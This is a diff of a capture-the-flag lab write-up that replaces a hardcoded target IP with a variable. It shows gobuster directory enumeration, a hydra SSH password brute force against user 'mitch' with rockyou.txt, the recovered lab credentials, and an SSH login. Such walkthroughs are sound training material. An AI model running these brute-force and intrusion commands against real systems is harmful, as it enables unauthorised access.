@@ -25,7 +25,7 @@ OS -- Apache 2 Ubuntu, Linux
 ### Gobuster
 
 ```
-gobuster dir -w /path/to/wordlist.txt -u http://10.10.121.109
+gobuster dir -w /path/to/wordlist.txt -u http://$IP
 ```
 
 Directories found:
@@ -71,7 +71,7 @@ found name `mitch` in `ForMitch.txt`
 Bruteforcing username `mitch` with `rockyou.txt` passwordlist on SSH port 2222
 
 ```bash
-hydra -l mitch -P wordlists/rockyou.txt ssh://10.10.121.109:2222
+hydra -l mitch -P wordlists/rockyou.txt ssh://$IP:2222
 ```
 
 found credentials: `mitch:secret`
@@ -79,7 +79,7 @@ found credentials: `mitch:secret`
 
 ## SSH into Machine
 ```bash
-ssh mitch@10.10.121.109 -p 2222
+ssh mitch@$IP -p 2222
 ```
 
 ```bash
